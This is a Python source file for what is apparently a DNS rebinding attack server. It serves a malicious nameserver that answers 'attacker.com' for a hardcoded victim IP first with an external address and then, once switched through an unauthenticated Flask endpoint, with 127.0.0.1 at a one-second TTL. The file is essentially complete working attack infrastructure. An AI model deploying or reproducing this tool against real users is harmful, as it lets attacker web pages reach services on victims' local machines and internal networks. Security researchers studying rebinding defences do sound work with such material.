import socketserver
import threading
from dns_request import Dns_Request, Query
import time
import sys
from flask import Flask, request

HOST = "0.0.0.0" 
WEBSERVER_PORT = 80
DNS_PORT = 53
app = Flask(__name__)

class Record:
    records = []

    def __init__(self, ip, responses):
        self.ip = ip
        self.responses = responses
        self.is_first = True  

        # replace record if one already exists for this ip
        r = Record.get_record(ip)
        if r is not None:
            Record.records.remove(r)
        Record.records.append(self)

    @staticmethod
    def get_record(ip):
        record = None
        for r in range(len(Record.records)):
            if ip == Record.records[r].ip:
                record = Record.records[r]
        return record

class Response:
    def __init__(self, hostname, ip, ttl):
        self.hostname = hostname
        self.ip = ip
        self.ttl = ttl

class DNSRequestHandler(socketserver.BaseRequestHandler):
    def get_data(self):
        return self.request[0].strip()

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)

    def handle(self):
        data = self.get_data()
        try:
            dns_request = Dns_Request(data)

            # ignore all record type requests except for an A record
            if len(dns_request.queries) < 1 or dns_request.queries[0].qtype != 1:
                self.send_data(data)
                return

            # try to add an answer to the request
            dns_request.turn_into_response(0)
            client_ip = self.client_address[0]
            self.try_add_answer(dns_request, client_ip)

            packed_dns_request = dns_request.pack()
            self.send_data(packed_dns_request)
        except Exception:
            print("Couldn't handle DNS request: {}".format(data))
            self.send_data(data)
    
    def try_add_answer(self, dns_request, client_ip):
        # if a record exists for the client ip, add an answer
        record = Record.get_record(client_ip)
        if record is not None:
            # check if this is the first request of the client, if so return the first response, else return the second response
            if record.is_first:
                response = record.responses[0]
            else:
                response = record.responses[1]
                
            print("returning hostname: {}; ip: {}; ttl: {}".format(response.hostname, response.ip, response.ttl))
            dns_request.add_answer(response.hostname, response.ip, response.ttl)

def main():
    print("Starting nameserver...")

    server = socketserver.ThreadingUDPServer((HOST, DNS_PORT), DNSRequestHandler)
    thread = threading.Thread(target=server.serve_forever)
    thread.daemon = True
    thread.start()

    try:
        Record.records.append(Record("86.80.57.210", [Response("attacker.com", "13.95.7.28", 1), Response("attacker.com", "127.0.0.1", 1)]))
        app.run(host=HOST, port=WEBSERVER_PORT)
    except KeyboardInterrupt:
        pass
    finally:
        server.shutdown()

@app.route('/add-dns')
def add_record():
    # TODO check input
    ip = request.args.get('ip')
    responses_raw = request.args.getlist('responses')
    if len(responses_raw) != 2:
        return "Expected 2 responses, actually got: {}".format(len(responses_raw))
    responses = []
    for r in range(len(responses_raw)):
        response_raw = responses_raw[r].split(" ")
        hostname = response_raw[0]
        response_ip = response_raw[1]
        ttl = int(response_raw[2])
        response = Response(hostname, response_ip, ttl)
        responses.append(response)

    # create new record
    Record(ip, responses)
    return 'Record created'

@app.route('/second-dns')
def second_dns():
    ip = request.args.get('ip')
    record = Record.get_record(ip)
    if record is None:
        return "Record for ip {} not found".format(ip)
    record.is_first = False
    return "Record for ip {} set to second".format(ip)

@app.route('/reset-dns')
def reset_record():
    ip = request.args.get('ip')
    record = Record.get_record(ip)
    if record is None:
        return "Record for ip {} not found".format(ip)

    # reset the status of this record to return the first response again
    record.is_first = True 
    return "Record for ip {} reset".format(ip)

@app.route('/delete-dns')
def delete_record():
    ip = request.args.get('ip')
    record = Record.get_record(ip)
    if record is None:
        return "Record for ip {} not found".format(ip)
    Record.records.remove(record)
    return "Record for ip {} removed".format(ip)

if __name__ == '__main__':
    main()